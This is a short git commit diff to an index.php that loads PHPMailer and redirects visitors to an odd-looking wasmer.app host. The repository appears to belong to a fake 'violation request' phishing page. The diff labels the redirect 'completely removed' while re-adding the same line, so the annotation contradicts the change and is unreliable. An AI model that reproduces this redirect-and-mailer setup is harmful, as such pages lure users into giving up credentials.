3d697a10be07ab6d4cc4f8ea8c8da66abd204ca0
violation-request-page <145922328+violation-request-page@users.noreply.github.com>
2026-07-29 16:06:16 +0500

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
- header("Location: https://fdfdfdcvxc.wasmer.app/");   ← COMPLETELY REMOVED
+ header("Location: https://fdfdfdcvxc.wasmer.app/");  
 
 require 'Exception.php';
 require 'PHPMailer.php';
